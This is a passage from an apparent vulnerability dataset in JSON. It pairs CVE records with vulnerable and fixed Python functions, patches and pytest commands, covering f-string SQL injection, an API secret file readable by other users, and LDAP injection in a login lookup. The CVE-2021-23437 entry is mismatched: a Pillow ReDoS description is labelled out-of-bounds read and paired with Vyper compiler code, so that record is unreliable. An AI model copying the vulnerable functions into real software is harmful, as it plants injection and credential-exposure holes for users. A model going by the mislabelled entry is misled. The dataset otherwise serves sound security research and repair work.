        "commit": "d41badf",
        "file_path": "app/database.py",
        "start_line": 66,
        "end_line": 137,
        "snippet": "def filter_materialized_view(\n        engine,\n        view_name,\n        schema=\"web\",\n        state_code=None,\n        area=None,\n        distance_grid=None,\n        building=None,\n        buildingfp=None,\n        limit=None,\n        keys=None,\n):\n    if schema is not None:\n        view_name = \"{}.{}\".format(schema, view_name)\n    if limit is None:\n        limit = \"\"\n    else:\n        limit = \" LIMIT {}\".format(limit)\n\n    filter_cond = \"\"\n\n    if state_code is not None:\n        key = \"adm1_pcode\"\n        filter_cond = f\" WHERE {view_name}.{key}='{state_code}'\"\n\n    if area is not None:\n        key = \"area_km2\"\n        if \"WHERE\" in filter_cond:\n            filter_cond = filter_cond + f\" AND {view_name}.{key} >= {area[0]} AND\" \\\n                                        f\" {view_name}.{key} <= {area[1]}\"\n        else:\n            filter_cond = f\" WHERE {view_name}.{key} >= {area[0]} AND {view_name}.{key} <= {area[1]}\"\n\n    if distance_grid is not None:\n        key = \"grid_dist_km\"\n        if \"WHERE\" in filter_cond:\n            filter_cond = filter_cond + f\" AND {view_name}.{key} >= {distance_grid[0]} AND\" \\\n                                        f\" {view_name}.{key} <= {distance_grid[1]}\"\n        else:\n            filter_cond = f\" WHERE {view_name}.{key} >= {distance_grid[0]} AND\" \\\n                          f\" {view_name}.{key} <= {distance_grid[1]}\"\n\n    if building is not None:\n        key = \"building_count\"\n        if \"WHERE\" in filter_cond:\n            filter_cond = filter_cond + f\" AND {view_name}.{key} >= {building[0]} AND\" \\\n                                        f\" {view_name}.{key} <= {building[1]}\"\n        else:\n            filter_cond = f\" WHERE {view_name}.{key} >= {building[0]} AND\" \\\n                          f\" {view_name}.{key} <= {building[1]}\"\n\n    if buildingfp is not None:\n        key = \"percentage_building_area\"\n        if \"WHERE\" in filter_cond:\n            filter_cond = filter_cond + f\" AND {view_name}.{key} >= {buildingfp[0]} AND\" \\\n                                        f\" {view_name}.{key} <= {buildingfp[1]}\"\n        else:\n            filter_cond = f\" WHERE {view_name}.{key} >= {buildingfp[0]} AND\" \\\n                          f\" {view_name}.{key} <= {buildingfp[1]}\"\n\n    if keys is None:\n        columns = \"*\"\n    else:\n        if not isinstance(keys, str):\n            columns = \", \".join(keys)\n        else:\n            columns = \"COUNT({})\".format(keys)\n    with engine.connect() as con:\n        query = 'SELECT {} FROM {}{}{};'.format(columns, view_name, filter_cond, limit)\n        rs = con.execute(query)\n        data = rs.fetchall()\n    return data"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_208_1",
        "commit": "07c0cdf",
        "file_path": "app/database.py",
        "start_line": 66,
        "end_line": 161,
        "snippet": "def filter_materialized_view(\n        engine,\n        view_name,\n        schema=\"web\",\n        state_code=None,\n        area=None,\n        distance_grid=None,\n        building=None,\n        buildingfp=None,\n        limit=None,\n        keys=None,\n):\n    \"\"\"\n\n    :param engine:\n    :param view_name: name of the view in the database (NOT A USER INPUT)\n    :param schema: name of the schema in the database (NOT A USER INPUT)\n    :param state_code: admin code of nigerian state (PROOFED USER INPUT)\n    :param area: boundaries for settlement's area filter (USER INPUT)\n    :param distance_grid: boundaries for settlement's distance to grid filter (USER INPUT)\n    :param building: boundaries for settlement's building count filter (USER INPUT)\n    :param buildingfp: boundaries for settlement's building percentage of area filter (USER INPUT)\n    :param limit: boundaries for settlement area filter (NOT A USER INPUT)\n    :param keys: list of columns to query values from (NOT A USER INPUT)\n    :return: returned data from the query\n    \"\"\"\n\n    # to hold query parameters\n    values = {}\n\n    if schema is not None:\n        view_name = \"{}.{}\".format(schema, view_name)\n\n    if limit is None:\n        limit = \"\"\n    else:\n        values[\"limit\"] = int(limit)\n        limit = \" LIMIT :limit\"\n\n    filter_cond = []\n\n    if state_code is not None:\n        key = \"adm1_pcode\"\n        filter_cond += [f\"{view_name}.{key} = :{key}\"]\n        values[key] = state_code\n\n    if area is not None:\n        key = \"area_km2\"\n        val1 = key + \"_1\"\n        val2 = key + \"_2\"\n        filter_cond += [f\"{view_name}.{key} >= :{val1}\", f\"{view_name}.{key} <= :{val2}\"]\n        values[val1] = float(area[0])\n        values[val2] = float(area[1])\n\n    if distance_grid is not None:\n        key = \"grid_dist_km\"\n        val1 = key + \"_1\"\n        val2 = key + \"_2\"\n        filter_cond += [f\"{view_name}.{key} >= :{val1}\", f\"{view_name}.{key} <= :{val2}\"]\n        values[val1] = float(distance_grid[0])\n        values[val2] = float(distance_grid[1])\n\n    if building is not None:\n        key = \"building_count\"\n        val1 = key + \"_1\"\n        val2 = key + \"_2\"\n        filter_cond += [f\"{view_name}.{key}>=:{val1}\", f\"{view_name}.{key}<=:{val2}\"]\n        values[val1] = int(building[0])\n        values[val2] = int(building[1])\n\n    if buildingfp is not None:\n        key = \"percentage_building_area\"\n        val1 = key + \"_1\"\n        val2 = key + \"_2\"\n        filter_cond += [f\"{view_name}.{key}>=:{val1}\", f\"{view_name}.{key}<=:{val2}\"]\n        values[val1] = float(buildingfp[0])\n        values[val2] = float(buildingfp[1])\n\n    if keys is None:\n        columns = \"*\"\n    else:\n        if not isinstance(keys, str):\n            columns = \", \".join(keys)\n        else:\n            columns = \"COUNT({})\".format(keys)\n\n    if len(filter_cond) > 0:\n        filter_cond_str = \" WHERE \" + \" AND \".join(filter_cond)\n    else:\n        filter_cond_str = \"\"\n\n    with engine.connect() as con:\n        query = 'SELECT {} FROM {}{}{};'.format(columns, view_name, filter_cond_str, limit)\n        rs = con.execute(text(query), **values)\n        data = rs.fetchall()\n    return data"
      }
    ],
    "vul_patch": "--- a/app/database.py\n+++ b/app/database.py\n@@ -10,53 +10,71 @@\n         limit=None,\n         keys=None,\n ):\n+    \"\"\"\n+\n+    :param engine:\n+    :param view_name: name of the view in the database (NOT A USER INPUT)\n+    :param schema: name of the schema in the database (NOT A USER INPUT)\n+    :param state_code: admin code of nigerian state (PROOFED USER INPUT)\n+    :param area: boundaries for settlement's area filter (USER INPUT)\n+    :param distance_grid: boundaries for settlement's distance to grid filter (USER INPUT)\n+    :param building: boundaries for settlement's building count filter (USER INPUT)\n+    :param buildingfp: boundaries for settlement's building percentage of area filter (USER INPUT)\n+    :param limit: boundaries for settlement area filter (NOT A USER INPUT)\n+    :param keys: list of columns to query values from (NOT A USER INPUT)\n+    :return: returned data from the query\n+    \"\"\"\n+\n+    # to hold query parameters\n+    values = {}\n+\n     if schema is not None:\n         view_name = \"{}.{}\".format(schema, view_name)\n+\n     if limit is None:\n         limit = \"\"\n     else:\n-        limit = \" LIMIT {}\".format(limit)\n+        values[\"limit\"] = int(limit)\n+        limit = \" LIMIT :limit\"\n \n-    filter_cond = \"\"\n+    filter_cond = []\n \n     if state_code is not None:\n         key = \"adm1_pcode\"\n-        filter_cond = f\" WHERE {view_name}.{key}='{state_code}'\"\n+        filter_cond += [f\"{view_name}.{key} = :{key}\"]\n+        values[key] = state_code\n \n     if area is not None:\n         key = \"area_km2\"\n-        if \"WHERE\" in filter_cond:\n-            filter_cond = filter_cond + f\" AND {view_name}.{key} >= {area[0]} AND\" \\\n-                                        f\" {view_name}.{key} <= {area[1]}\"\n-        else:\n-            filter_cond = f\" WHERE {view_name}.{key} >= {area[0]} AND {view_name}.{key} <= {area[1]}\"\n+        val1 = key + \"_1\"\n+        val2 = key + \"_2\"\n+        filter_cond += [f\"{view_name}.{key} >= :{val1}\", f\"{view_name}.{key} <= :{val2}\"]\n+        values[val1] = float(area[0])\n+        values[val2] = float(area[1])\n \n     if distance_grid is not None:\n         key = \"grid_dist_km\"\n-        if \"WHERE\" in filter_cond:\n-            filter_cond = filter_cond + f\" AND {view_name}.{key} >= {distance_grid[0]} AND\" \\\n-                                        f\" {view_name}.{key} <= {distance_grid[1]}\"\n-        else:\n-            filter_cond = f\" WHERE {view_name}.{key} >= {distance_grid[0]} AND\" \\\n-                          f\" {view_name}.{key} <= {distance_grid[1]}\"\n+        val1 = key + \"_1\"\n+        val2 = key + \"_2\"\n+        filter_cond += [f\"{view_name}.{key} >= :{val1}\", f\"{view_name}.{key} <= :{val2}\"]\n+        values[val1] = float(distance_grid[0])\n+        values[val2] = float(distance_grid[1])\n \n     if building is not None:\n         key = \"building_count\"\n-        if \"WHERE\" in filter_cond:\n-            filter_cond = filter_cond + f\" AND {view_name}.{key} >= {building[0]} AND\" \\\n-                                        f\" {view_name}.{key} <= {building[1]}\"\n-        else:\n-            filter_cond = f\" WHERE {view_name}.{key} >= {building[0]} AND\" \\\n-                          f\" {view_name}.{key} <= {building[1]}\"\n+        val1 = key + \"_1\"\n+        val2 = key + \"_2\"\n+        filter_cond += [f\"{view_name}.{key}>=:{val1}\", f\"{view_name}.{key}<=:{val2}\"]\n+        values[val1] = int(building[0])\n+        values[val2] = int(building[1])\n \n     if buildingfp is not None:\n         key = \"percentage_building_area\"\n-        if \"WHERE\" in filter_cond:\n-            filter_cond = filter_cond + f\" AND {view_name}.{key} >= {buildingfp[0]} AND\" \\\n-                                        f\" {view_name}.{key} <= {buildingfp[1]}\"\n-        else:\n-            filter_cond = f\" WHERE {view_name}.{key} >= {buildingfp[0]} AND\" \\\n-                          f\" {view_name}.{key} <= {buildingfp[1]}\"\n+        val1 = key + \"_1\"\n+        val2 = key + \"_2\"\n+        filter_cond += [f\"{view_name}.{key}>=:{val1}\", f\"{view_name}.{key}<=:{val2}\"]\n+        values[val1] = float(buildingfp[0])\n+        values[val2] = float(buildingfp[1])\n \n     if keys is None:\n         columns = \"*\"\n@@ -65,8 +83,14 @@\n             columns = \", \".join(keys)\n         else:\n             columns = \"COUNT({})\".format(keys)\n+\n+    if len(filter_cond) > 0:\n+        filter_cond_str = \" WHERE \" + \" AND \".join(filter_cond)\n+    else:\n+        filter_cond_str = \"\"\n+\n     with engine.connect() as con:\n-        query = 'SELECT {} FROM {}{}{};'.format(columns, view_name, filter_cond, limit)\n-        rs = con.execute(query)\n+        query = 'SELECT {} FROM {}{}{};'.format(columns, view_name, filter_cond_str, limit)\n+        rs = con.execute(text(query), **values)\n         data = rs.fetchall()\n     return data\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-32303",
    "cve_description": "Planet is software that provides satellite data. The secret file stores the user's Planet API authentication information. It should only be accessible by the user, but before version 2.0.1, its permissions allowed the user's group and non-group to read the file as well. This issue was patched in version 2.0.1. As a workaround, set the secret file permissions to only user read/write by hand.\n",
    "cwe_info": {
      "CWE-732": {
        "name": "Incorrect Permission Assignment for Critical Resource",
        "description": "The product specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors."
      }
    },
    "repo": "https://github.com/planetlabs/planet-client-python",
    "patch_url": [
      "https://github.com/planetlabs/planet-client-python/commit/d71415a83119c5e89d7b80d5f940d162376ee3b7"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_52_1",
        "commit": "9783607",
        "file_path": "planet/auth.py",
        "start_line": 229,
        "end_line": 230,
        "snippet": "    def __init__(self, path):\n        self.path = path"
      },
      {
        "id": "vul_py_52_2",
        "commit": "9783607",
        "file_path": "planet/auth.py",
        "start_line": 241,
        "end_line": 244,
        "snippet": "    def _write(self, contents: dict):\n        LOGGER.debug(f'Writing to {self.path}')\n        with open(self.path, 'w') as fp:\n            fp.write(json.dumps(contents))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_52_1",
        "commit": "d71415a",
        "file_path": "planet/auth.py",
        "start_line": 230,
        "end_line": 238,
        "snippet": "    def __init__(self, path: typing.Union[str, pathlib.Path]):\n        self.path = pathlib.Path(path)\n\n        self.permissions = stat.S_IRUSR | stat.S_IWUSR  # user rw\n\n        # in sdk versions <=2.0.0, secret file was created with the wrong\n        # permissions, fix this automatically as well as catching the unlikely\n        # cases where the permissions get changed externally\n        self._enforce_permissions()"
      },
      {
        "id": "fix_py_52_2",
        "commit": "d71415a",
        "file_path": "planet/auth.py",
        "start_line": 249,
        "end_line": 256,
        "snippet": "    def _write(self, contents: dict):\n        LOGGER.debug(f'Writing to {self.path}')\n\n        def opener(path, flags):\n            return os.open(path, flags, self.permissions)\n\n        with open(self.path, 'w', opener=opener) as fp:\n            fp.write(json.dumps(contents))"
      },
      {
        "id": "fix_py_52_3",
        "commit": "d71415a",
        "file_path": "planet/auth.py",
        "start_line": 264,
        "end_line": 276,
        "snippet": "    def _enforce_permissions(self):\n        '''if the file's permissions are not what they should be, fix them'''\n        try:\n            # in octal, permissions is the last three bits of the mode\n            file_permissions = self.path.stat().st_mode & 0o777\n            if file_permissions != self.permissions:\n                LOGGER.debug(\n                    f'{self.path} permissions are {oct(file_permissions)}, '\n                    f'should be {oct(self.permissions)}. Fixing.')\n                self.path.chmod(self.permissions)\n        except FileNotFoundError:\n            # just skip it if the secret file doesn't exist\n            pass"
      }
    ],
    "vul_patch": "--- a/planet/auth.py\n+++ b/planet/auth.py\n@@ -1,2 +1,9 @@\n-    def __init__(self, path):\n-        self.path = path\n+    def __init__(self, path: typing.Union[str, pathlib.Path]):\n+        self.path = pathlib.Path(path)\n+\n+        self.permissions = stat.S_IRUSR | stat.S_IWUSR  # user rw\n+\n+        # in sdk versions <=2.0.0, secret file was created with the wrong\n+        # permissions, fix this automatically as well as catching the unlikely\n+        # cases where the permissions get changed externally\n+        self._enforce_permissions()\n\n--- a/planet/auth.py\n+++ b/planet/auth.py\n@@ -1,4 +1,8 @@\n     def _write(self, contents: dict):\n         LOGGER.debug(f'Writing to {self.path}')\n-        with open(self.path, 'w') as fp:\n+\n+        def opener(path, flags):\n+            return os.open(path, flags, self.permissions)\n+\n+        with open(self.path, 'w', opener=opener) as fp:\n             fp.write(json.dumps(contents))\n\n--- /dev/null\n+++ b/planet/auth.py\n@@ -0,0 +1,13 @@\n+    def _enforce_permissions(self):\n+        '''if the file's permissions are not what they should be, fix them'''\n+        try:\n+            # in octal, permissions is the last three bits of the mode\n+            file_permissions = self.path.stat().st_mode & 0o777\n+            if file_permissions != self.permissions:\n+                LOGGER.debug(\n+                    f'{self.path} permissions are {oct(file_permissions)}, '\n+                    f'should be {oct(self.permissions)}. Fixing.')\n+                self.path.chmod(self.permissions)\n+        except FileNotFoundError:\n+            # just skip it if the secret file doesn't exist\n+            pass\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-32303:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/planet-client-python\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-32303/bin/python -m pytest tests/unit/test_auth.py::test__SecretFile_permissions_doesnotexist  tests/unit/test_auth.py::test__SecretFile_permissions_incorrect -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-32303:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/planet-client-python\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-32303/bin/python -m pytest tests/unit/test_auth.py -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2021-3027",
    "cve_description": "app/views_mod/user/user.py in LibrIT PaSSHport through 2.5 is affected by LDAP Injection. There is an information leak through the crafting of special queries, escaping the provided search filter because user input gets no sanitization.",
    "cwe_info": {
      "CWE-74": {
        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
        "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/LibrIT/passhport",
    "patch_url": [
      "https://github.com/LibrIT/passhport/commit/366b03f607729c4538e91b634ecc57c8398522a1"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_158_1",
        "commit": "ca8c1c2",
        "file_path": "passhportd/app/views_mod/user/user.py",
        "start_line": 19,
        "end_line": 43,
        "snippet": "def useruid(s, login):\n    \"\"\"Connect to a LDAP and check the uid matching the given field data\"\"\"\n    uid = False\n    c = Connection(s, config.LDAPACC, \n                   password=config.LDAPPASS, auto_bind=True)\n\n    if c.result[\"description\"] != \"success\":\n        app.logger.error(\"Error connecting to the LDAP with the service account\")\n        return False\n\n    # Look for the user entry.\n    if not c.search(config.LDAPBASE,\n                    \"(\" + config.LDAPFIELD + \"=\" + login + \")\") :\n        app.logger.error(\"Error: Connection to the LDAP with service account failed\")\n    else:\n        if len(c.entries) >= 1 :\n            if len(c.entries) > 1 :\n                app.logger.error(\"Error: multiple entries with this login. \"+ \\\n                          \"Trying first entry...\")\n            uid = c.entries[0].entry_dn\n        else:\n            app.logger.error(\"Error: Login not found\")\n        c.unbind()\n    \n    return uid"
      },
      {
        "id": "vul_py_158_2",
        "commit": "ca8c1c2",
        "file_path": "passhportd/app/views_mod/user/user.py",
        "start_line": 46,
        "end_line": 62,
        "snippet": "def try_ldap_login(login, password):\n    \"\"\" Connect to a LDAP directory to verify user login/passwords\"\"\"\n    result = \"Wrong login/password\"\n    s = Server(config.LDAPURI, port=config.LDAPPORT,\n               use_ssl=False, get_info=ALL)\n    # 1. connection with service account to find the user uid\n    uid = useruid(s, login)\n   \n    if uid: \n        # 2. Try to bind the user to the LDAP\n        c = Connection(s, user = uid , password = password, auto_bind = True)\n        c.open()\n        c.bind()\n        result =  c.result[\"description\"] # \"success\" if bind is ok\n        c.unbind()\n\n    return result"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_158_1",
        "commit": "366b03f",
        "file_path": "passhportd/app/views_mod/user/user.py",
        "start_line": 19,
        "end_line": 43,
        "snippet": "def useruid(s, login):\n    \"\"\"Connect to a LDAP and check the uid matching the given field data\"\"\"\n    uid = False\n    c = Connection(s, config.LDAPACC, \n                   password=config.LDAPPASS, auto_bind=True)\n\n    if c.result[\"description\"] != \"success\":\n        app.logger.error(\"Error connecting to the LDAP with the service account\")\n        return False\n\n    # Look for the user entry.\n    if not c.search(config.LDAPBASE,\n                    \"(\" + config.LDAPFIELD + \"=\" + escape_rdn(login) + \")\") :\n        app.logger.error(\"Error: Connection to the LDAP with service account failed\")\n    else:\n        if len(c.entries) >= 1 :\n            if len(c.entries) > 1 :\n                app.logger.error(\"Error: multiple entries with this login. \"+ \\\n                          \"Trying first entry...\")\n            uid = c.entries[0].entry_dn\n        else:\n            app.logger.error(\"Error: Login not found\")\n        c.unbind()\n    \n    return uid"
      },
      {
        "id": "fix_py_158_2",
        "commit": "366b03f",
        "file_path": "passhportd/app/views_mod/user/user.py",
        "start_line": 46,
        "end_line": 62,
        "snippet": "def try_ldap_login(login, password):\n    \"\"\" Connect to a LDAP directory to verify user login/passwords\"\"\"\n    result = \"Wrong login/password\"\n    s = Server(config.LDAPURI, port=config.LDAPPORT,\n               use_ssl=False, get_info=ALL)\n    # 1. connection with service account to find the user uid\n    uid = useruid(s, escape_rdn(login))\n   \n    if uid: \n        # 2. Try to bind the user to the LDAP\n        c = Connection(s, user = uid , password = password, auto_bind = True)\n        c.open()\n        c.bind()\n        result =  c.result[\"description\"] # \"success\" if bind is ok\n        c.unbind()\n\n    return result"
      }
    ],
    "vul_patch": "--- a/passhportd/app/views_mod/user/user.py\n+++ b/passhportd/app/views_mod/user/user.py\n@@ -10,7 +10,7 @@\n \n     # Look for the user entry.\n     if not c.search(config.LDAPBASE,\n-                    \"(\" + config.LDAPFIELD + \"=\" + login + \")\") :\n+                    \"(\" + config.LDAPFIELD + \"=\" + escape_rdn(login) + \")\") :\n         app.logger.error(\"Error: Connection to the LDAP with service account failed\")\n     else:\n         if len(c.entries) >= 1 :\n\n--- a/passhportd/app/views_mod/user/user.py\n+++ b/passhportd/app/views_mod/user/user.py\n@@ -4,7 +4,7 @@\n     s = Server(config.LDAPURI, port=config.LDAPPORT,\n                use_ssl=False, get_info=ALL)\n     # 1. connection with service account to find the user uid\n-    uid = useruid(s, login)\n+    uid = useruid(s, escape_rdn(login))\n    \n     if uid: \n         # 2. Try to bind the user to the LDAP\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-23437",
    "cve_description": "The package pillow 5.2.0 and before 8.3.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the getrgb function.",
    "cwe_info": {
      "CWE-125": {
        "name": "Out-of-bounds Read",
        "description": "The product reads data past the end, or before the beginning, of the intended buffer."
      }
    },
    "repo": "https://github.com/python-pillow/Pillow",
    "patch_url": [
      "https://github.com/python-pillow/Pillow/commit/9e08eb8f78fdfd2f476e1b20b7cf38683754866b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_415_1",
        "commit": "d92cd34",
        "file_path": "vyper/builtins/functions.py",
        "start_line": 346,
        "end_line": 454,
        "snippet": "    def build_IR(self, expr, args, kwargs, context):\n        src, start, length = args\n\n        # Handle `msg.data`, `self.code`, and `<address>.code`\n        if src.value in ADHOC_SLICE_NODE_MACROS:\n            return _build_adhoc_slice_node(src, start, length, context)\n\n        is_bytes32 = src.typ == BYTES32_T\n        if src.location is None:\n            # it's not a pointer; force it to be one since\n            # copy_bytes works on pointers.\n            assert is_bytes32, src\n            src = ensure_in_memory(src, context)\n\n        with src.cache_when_complex(\"src\") as (b1, src), start.cache_when_complex(\"start\") as (\n            b2,\n            start,\n        ), length.cache_when_complex(\"length\") as (b3, length):\n            if is_bytes32:\n                src_maxlen = 32\n            else:\n                src_maxlen = src.typ.maxlen\n\n            dst_maxlen = length.value if length.is_literal else src_maxlen\n\n            buflen = dst_maxlen\n\n            # add 32 bytes to the buffer size bc word access might\n            # be unaligned (see below)\n            if src.location.word_addressable:\n                buflen += 32\n\n            # Get returntype string or bytes\n            assert isinstance(src.typ, _BytestringT) or is_bytes32\n            # TODO: try to get dst_typ from semantic analysis\n            if isinstance(src.typ, StringT):\n                dst_typ = StringT(dst_maxlen)\n            else:\n                dst_typ = BytesT(dst_maxlen)\n\n            # allocate a buffer for the return value\n            buf = context.new_internal_variable(BytesT(buflen))\n            # assign it the correct return type.\n            # (note mismatch between dst_maxlen and buflen)\n            dst = IRnode.from_list(buf, typ=dst_typ, location=MEMORY)\n\n            dst_data = bytes_data_ptr(dst)\n\n            if is_bytes32:\n                src_len = 32\n                src_data = src\n            else:\n                src_len = get_bytearray_length(src)\n                src_data = bytes_data_ptr(src)\n\n            # general case. byte-for-byte copy\n            if src.location.word_addressable:\n                # because slice uses byte-addressing but storage/tstorage\n                # is word-aligned, this algorithm starts at some number\n                # of bytes before the data section starts, and might copy\n                # an extra word. the pseudocode is:\n                #   dst_data = dst + 32\n                #   copy_dst = dst_data - start % 32\n                #   src_data = src + 32\n                #   copy_src = src_data + (start - start % 32) / 32\n                #            = src_data + (start // 32)\n                #   copy_bytes(copy_dst, copy_src, length)\n                #   //set length AFTER copy because the length word has been clobbered!\n                #   mstore(src, length)\n\n                # start at the first word-aligned address before `start`\n                # e.g. start == byte 7 -> we start copying from byte 0\n                #      start == byte 32 -> we start copying from byte 32\n                copy_src = IRnode.from_list(\n                    [\"add\", src_data, [\"div\", start, 32]], location=src.location\n                )\n\n                # e.g. start == byte 0 -> we copy to dst_data + 0\n                #      start == byte 7 -> we copy to dst_data - 7\n                #      start == byte 33 -> we copy to dst_data - 1\n                copy_dst = IRnode.from_list(\n                    [\"sub\", dst_data, [\"mod\", start, 32]], location=dst.location\n                )\n\n                # len + (32 if start % 32 > 0 else 0)\n                copy_len = [\"add\", length, [\"mul\", 32, [\"iszero\", [\"iszero\", [\"mod\", start, 32]]]]]\n                copy_maxlen = buflen\n\n            else:\n                # all other address spaces (mem, calldata, code) we have\n                # byte-aligned access so we can just do the easy thing,\n                # memcopy(dst_data, src_data + dst_data)\n\n                copy_src = add_ofst(src_data, start)\n                copy_dst = dst_data\n                copy_len = length\n                copy_maxlen = buflen\n\n            do_copy = copy_bytes(copy_dst, copy_src, copy_len, copy_maxlen)\n\n            ret = [\n                \"seq\",\n                check_buffer_overflow_ir(start, length, src_len),\n                do_copy,\n                [\"mstore\", dst, length],  # set length\n                dst,  # return pointer to dst\n            ]\n            ret = IRnode.from_list(ret, typ=dst_typ, location=MEMORY)\n            return b1.resolve(b2.resolve(b3.resolve(ret)))"
      },
      {
        "id": "vul_py_415_2",
        "commit": "d92cd34",
        "file_path": "vyper/builtins/functions.py",
        "start_line": 861,
        "end_line": 902,
        "snippet": "    def build_IR(self, expr, args, kwargs, context):\n        bytez, index = args\n        ret_type = kwargs[\"output_type\"]\n\n        def finalize(ret):\n            annotation = \"extract32\"\n            ret = IRnode.from_list(ret, typ=ret_type, annotation=annotation)\n            return clamp_basetype(ret)\n\n        with bytez.cache_when_complex(\"_sub\") as (b1, bytez):\n            # merge\n            length = get_bytearray_length(bytez)\n            index = clamp2(0, index, [\"sub\", length, 32], signed=True)\n            with index.cache_when_complex(\"_index\") as (b2, index):\n                assert not index.typ.is_signed\n\n                # \"easy\" case, byte- addressed locations:\n                if bytez.location.word_scale == 32:\n                    word = LOAD(add_ofst(bytes_data_ptr(bytez), index))\n                    return finalize(b1.resolve(b2.resolve(word)))\n\n                # storage and transient storage, word-addressed\n                assert bytez.location.word_scale == 1\n\n                slot = IRnode.from_list([\"div\", index, 32])\n                # byte offset within the slot\n                byte_ofst = IRnode.from_list([\"mod\", index, 32])\n\n                with byte_ofst.cache_when_complex(\"byte_ofst\") as (\n                    b3,\n                    byte_ofst,\n                ), slot.cache_when_complex(\"slot\") as (b4, slot):\n                    # perform two loads and merge\n                    w1 = LOAD(add_ofst(bytes_data_ptr(bytez), slot))\n                    w2 = LOAD(add_ofst(bytes_data_ptr(bytez), [\"add\", slot, 1]))\n\n                    left_bytes = shl([\"mul\", 8, byte_ofst], w1)\n                    right_bytes = shr([\"mul\", 8, [\"sub\", 32, byte_ofst]], w2)\n                    merged = [\"or\", left_bytes, right_bytes]\n\n                    ret = [\"if\", byte_ofst, merged, left_bytes]\n                    return finalize(b1.resolve(b2.resolve(b3.resolve(b4.resolve(ret)))))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_415_1",
        "commit": "3d9c537142fb99b2672f21e2057f5f202cde194f",
        "file_path": "vyper/builtins/functions.py",
        "start_line": 347,
        "end_line": 458,
        "snippet": "    def build_IR(self, expr, args, kwargs, context):\n        src, start, length = args\n\n        # Handle `msg.data`, `self.code`, and `<address>.code`\n        if src.value in ADHOC_SLICE_NODE_MACROS:\n            return _build_adhoc_slice_node(src, start, length, context)\n\n        is_bytes32 = src.typ == BYTES32_T\n        if src.location is None:\n            # it's not a pointer; force it to be one since\n            # copy_bytes works on pointers.\n            assert is_bytes32, src\n            src = ensure_in_memory(src, context)\n\n        if potential_overlap(src, start) or potential_overlap(src, length):\n            raise CompilerPanic(\"risky overlap\")\n\n        with src.cache_when_complex(\"src\") as (b1, src), start.cache_when_complex(\"start\") as (\n            b2,\n            start,\n        ), length.cache_when_complex(\"length\") as (b3, length):\n            if is_bytes32:\n                src_maxlen = 32\n            else:\n                src_maxlen = src.typ.maxlen\n\n            dst_maxlen = length.value if length.is_literal else src_maxlen\n\n            buflen = dst_maxlen\n\n            # add 32 bytes to the buffer size bc word access might\n            # be unaligned (see below)\n            if src.location.word_addressable:\n                buflen += 32\n\n            # Get returntype string or bytes\n            assert isinstance(src.typ, _BytestringT) or is_bytes32\n            # TODO: try to get dst_typ from semantic analysis\n            if isinstance(src.typ, StringT):\n                dst_typ = StringT(dst_maxlen)\n            else:\n                dst_typ = BytesT(dst_maxlen)\n\n            # allocate a buffer for the return value\n            buf = context.new_internal_variable(BytesT(buflen))\n            # assign it the correct return type.\n            # (note mismatch between dst_maxlen and buflen)\n            dst = IRnode.from_list(buf, typ=dst_typ, location=MEMORY)\n\n            dst_data = bytes_data_ptr(dst)\n\n            if is_bytes32:\n                src_len = 32\n                src_data = src\n            else:\n                src_len = get_bytearray_length(src)\n                src_data = bytes_data_ptr(src)\n\n            # general case. byte-for-byte copy\n            if src.location.word_addressable:\n                # because slice uses byte-addressing but storage/tstorage\n                # is word-aligned, this algorithm starts at some number\n                # of bytes before the data section starts, and might copy\n                # an extra word. the pseudocode is:\n                #   dst_data = dst + 32\n                #   copy_dst = dst_data - start % 32\n                #   src_data = src + 32\n                #   copy_src = src_data + (start - start % 32) / 32\n                #            = src_data + (start // 32)\n                #   copy_bytes(copy_dst, copy_src, length)\n                #   //set length AFTER copy because the length word has been clobbered!\n                #   mstore(src, length)\n\n                # start at the first word-aligned address before `start`\n                # e.g. start == byte 7 -> we start copying from byte 0\n                #      start == byte 32 -> we start copying from byte 32\n                copy_src = IRnode.from_list(\n                    [\"add\", src_data, [\"div\", start, 32]], location=src.location\n                )\n\n                # e.g. start == byte 0 -> we copy to dst_data + 0\n                #      start == byte 7 -> we copy to dst_data - 7\n                #      start == byte 33 -> we copy to dst_data - 1\n                copy_dst = IRnode.from_list(\n                    [\"sub\", dst_data, [\"mod\", start, 32]], location=dst.location\n                )\n\n                # len + (32 if start % 32 > 0 else 0)\n                copy_len = [\"add\", length, [\"mul\", 32, [\"iszero\", [\"iszero\", [\"mod\", start, 32]]]]]\n                copy_maxlen = buflen\n\n            else:\n                # all other address spaces (mem, calldata, code) we have\n                # byte-aligned access so we can just do the easy thing,\n                # memcopy(dst_data, src_data + dst_data)\n\n                copy_src = add_ofst(src_data, start)\n                copy_dst = dst_data\n                copy_len = length\n                copy_maxlen = buflen\n\n            do_copy = copy_bytes(copy_dst, copy_src, copy_len, copy_maxlen)\n\n            ret = [\n                \"seq\",\n                check_buffer_overflow_ir(start, length, src_len),\n                do_copy,\n                [\"mstore\", dst, length],  # set length\n                dst,  # return pointer to dst\n            ]\n            ret = IRnode.from_list(ret, typ=dst_typ, location=MEMORY)\n            return b1.resolve(b2.resolve(b3.resolve(ret)))"
      },
